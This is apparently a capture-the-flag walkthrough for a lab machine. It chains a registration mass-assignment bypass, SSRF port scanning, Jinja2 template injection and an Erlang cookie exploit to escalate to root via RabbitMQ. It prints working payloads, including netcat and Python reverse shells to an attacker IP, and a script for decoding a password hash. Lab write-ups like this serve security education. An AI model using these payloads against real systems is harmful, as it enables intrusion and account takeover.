- Questions
	1- What is the user flag?
	2- What is the Root flag?

Before we start, We need to add the host into our /etc/hosts
* sudo vim /etc/hosts
*  10.80.139.58 cloudsite.thm www.cloudsite.tthm
Now we can access the site, So we start our basic enums.

* nmap
	nmap -T4 -p- -A -r -Pn -v -sV -oN scan.nmap  10.80.139.58
	![[Pasted image 20260217112240.png]]
	We found 3 open ports
	Classic SSH on port 22, And the web page on 80.
	However, We found 2 more unusual ports, So i dig into them.
	For Port 4369, I Found erlang port mapper on hacktricks
	`https://book.hacktricks.wiki/en/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html`
	But, We need a leaked cookie to even use it. So thats out for now, perhaps we gonna need it later.
	
	For port 25672, I Find a rabbitMQ page on "hackviser" which is linked to 25672 port.
	"https://hackviser.com/tactics/pentesting/services/rabbitmq"
	However, Its still not useful for now.


* ffuf
	ffuf -u http://cloudsite.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 -s .php,.txt,.html
	
	![[Pasted image 20260217112153.png]]
	
	We find /assets
	We investigate it, But there is nothing useful i found in there.

Since we have nothing else to look for, We go back to the main page, And we just browse through it normally,


* Broken access control
	There is a register/login page on top right, But we need the new domain to our /etc/hosts
	* sudo vim /etc/hosts
	* 10.80.139.58 storage.cloudsite.thm www.storage.cloudsite.tthm
	And we make an account.
	![[Pasted image 20260217115456.png]]
	
	We register and we try to log-in with the creds, But we are an inactive user So we cant access the site.
	![[Pasted image 20260217115527.png]]
	
	So i check the cookies after the log-in, And we have a JWT Token,
	Using "[fusionauth](https://fusionauth.io/dev-tools/jwt-decoder)"
	
	![[Pasted image 20260217115705.png]]
	
	But, We dont have the secret key to manually just edit it and make it "active", So What if we make a new account and manually add through registering?
	
	So, we hop on our burpsuite, And we intercept the register request to manually add it before its sent.
	![[Pasted image 20260217115936.png]]
	
	So it goes from this
	`{`
	    `"email":"admin2@example.com",`
	    `"password":"admin"`
	`}`
	To
	`{`
	    `"email":"admin2@example.com",`
	    `"password":"admin",`
	    `"subscription":"active"`
	`}`

* Getting access to internal data.
	And then we try to login with the new account "admin2"
	And we are in
	![[Pasted image 20260217120336.png]]
	
	
	We have 3 main functions.
	
	Upload from our local machine,AKA Upload an image or a revshell or whatso.
	Upload from a URL, So maybe we host a python httpserver alongside ngrok to upload files.
	
	And the last one is just to show files we uploaded.
	So, We try to just upload a rev-shell so that maybe we can get access into internal data.
	![[Pasted image 20260217120601.png]]
	But there is an issue.. Anything we upload, Its name gets randomized, Usually its an issue so that we cant just guess the file name, But it doesnt matter here since they already give the name to us, But the bigger issue is, It strips all exttensions!
	I Tried alot to try to bypass it, nullbytes,double extension, etc, But no luck.
	
	Then it caught me, /api/uploads/
	What if we try to enumerate the apis using ffuf?
	So thats what i started doing.

* API Enumeration
	![[Pasted image 20260217121056.png]]
	Nothing seems promising, Except the "docs", So we try to check it out
	![[Pasted image 20260217121043.png]]
	But we cant, it returns access denied, So We most likely need to try to find a vulnerability to access it, Something like an "SSRF".
	Then it hit me, SInce we can upload from a URL, What if we just try to "localhost" it?
	And it works, We can access internal files using SSRF


* SSRF Vector
	Since we can access the internal files, We can get access to the /api/docs
	But localhost returns the static cloudsite.thm site, And the API is hosted on the storage.cloudsite.thm,
	So we need to find the port.
	I Wrote a python script to automate the port scanning payload.
	`import requests`
	
	`import json`
	
	`from concurrent.futures import ThreadPoolExecutor`
	
	`import sys`
	
	  
	
	`target = "http://storage.cloudsite.thm/api/store-url"`
	
	`jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGV4YW1wbGUuY29tIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzcxMzE4MzMyLCJleHAiOjE3NzEzMjE5MzJ9.FwuvuxMLVypzYw1FhQGagtXVydJgfi9YLcXy3ejFwdU"`
	
	`ports = range(1,65535)`
	
	`cookies = {"jwt":jwt}`
	
	`headers = {'Content-type':'application/json'}`
	
	`completed = 0`
	
	  
	
	`def scan(port):`
	
	`global completed`
	
	`payload = {"url":f"http://localhost:{port}/"}`
	
	`try:`
	
	`response = requests.post(target,headers=headers,cookies=cookies,json=payload)`
	
	`completed += 1`
	
	`sys.stdout.write(f"\r[*] Progress:{completed}/{len(ports)} (Checking port {port})")`
	
	`sys.stdout.flush()`
	
	`if response.status_code != 401 and len(response.text) != 41:`
	
	`print(f"\nPort {port}: Status {response.status_code} | Size: {len(response.text)}")`
	
	`except Exception:`
	
	`completed += 1`
	
	  
	
	`print(f"Starting scan")`
	
	`with ThreadPoolExecutor(max_workers=100) as exec:`
	
	`exec.map(scan, ports)`
	
	And we run it
	![[Pasted image 20260217130104.png]]
	And we found 3 ports,
	But only "3000" Helps us access the /api/docs
	So we grab it and take a look
	![[Pasted image 20260217130319.png]]
	![[Pasted image 20260217130337.png]]
	And we find a new api! 
	"/api/fetch_messeges_from_chatbot"
	So we just access it with burp for an easier time. 
	And we modify it to be a "POST", And add the "content-type: application/json"
	![[Pasted image 20260217130720.png]]
	It asks for a username paramter and it repeats it back to us
	![[Pasted image 20260217130758.png]]

* SSTI
	Since it "echoes" our text back to us, Most likely Its an SSTI, Server side template injection, We can try to inject polyglot to check if its vulnerable or not.
	* ![[Pasted image 20260217131028.png]]
	* And yes its vulnerable and its Jinja2 python template.
	* Lets try `{{7*7}}`
	* ![[Pasted image 20260217131132.png]]
	* And we are in!, Now we can try to set a rev-shell using OS Commands
	* `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
	* ![[Pasted image 20260217131402.png]]
	* Now we set a netcat listner on our machine, nc -lvnp 1234
	And we use the payload
	* `"{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.184.65 1234 >/tmp/f').read()}}"`
	![[Pasted image 20260217132037.png]]And we are in in the machine!
	![[Pasted image 20260217132116.png]]
	So we go ahead and grab the first flag!
	![[Pasted image 20260217132144.png]]


* PE Part 1
	Since we know the server is running on rabbitMQ
	From the clues we had earlier
	* NMap showed 2 ports, **`5672`** + **`25672`** 
	* And When we enumerated the insides of the machine with the port script, We got **`15672`** 
	* And when we browsed hackerviser earlier, We saw that we need a leaked cookie, We can try to locate that since we are inside of the machine
	* Just one quick google search, We find its location And we have the cookie.
	* ![[Pasted image 20260217132718.png]]
	* And we have .erlang.cookie!
	* cat .erlang.cookie
		`wNkProKxfl30BVjY`
	We can google search Until i came across
	https://github.com/gteissier/erl-matter/blob/master/shell-erldp.py
	We use it get a rev-shell on the user rabbit.
	* `python2 shell-erldp.py 10.80.164.183 25672 wNkProKxfl30BVjY`
	* Once it connects, We do
	* `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.184.65",1233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
	* ![[Pasted image 20260217143836.png]]
	* But before we can use the rabbitmcq commands, We need to be the owner of the cookie, So we do, 
	* chmod 600 .erlang.cookie
	* ![[Pasted image 20260217144232.png]]
	* And there is root, But we cant just access it easily, We need to access the internal hashed passwords.
	* We can try to make a new user and give it the tag of "administrator"
	*  rabbitmqctl add_user `<username> <password>`
	And we add administraotr to it using 
	* rabbitmqctl set_user_tags `<username>` administrator
	* ![[Pasted image 20260217144625.png]]
	* Now we have our own administrator account,
	* Now we can access the internal users list of which where the password hashes are stored!
	* And we get the root hashed password.
	* ![[Pasted image 20260217144904.png]]
	* Now we need to bring it back to its original form.
	* Luckily we can find the documination of the hashed on the rabbit mq offical site
	* ![[Pasted image 20260217145002.png]]
	* `{"name":"root","password_hash":"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF","hashing_algorithm":"rabbit_password_hashing_sha256","tags":["administrator"],"limits":{}}`
	* From the provided algorithm We understand few things.
	* FIrst, It generates a random 32 "bit" salt, Every byte is 8 bits, So 32/8, Its 4 bytes.
	* Then it makes 256 "bit" for the hash. So 256/8 = 32 byte.
	* And then its encoded into base64
	* We can use a python script to get the hash out!
	`import base64`
	
	`import binascii`
	`hash="49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF"`
		
	`def decoder(hash):`
	
	`decoded = base64.b64decode(hash)`
	
	`salt = decoded[:4]`
	
	`hashedpassword = decoded[4:]`
	
	`print(f"Salt is:{binascii.hexlify(salt).decode()}")`
	
	`print(f"Hash is:{binascii.hexlify(hashedpassword).decode()}")`
	
	`decoder(hash)`
	![[Pasted image 20260217151115.png]]
	And we get the hash.
	So the final step is.
	su - root
	Password: 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
	![[Pasted image 20260217151151.png]]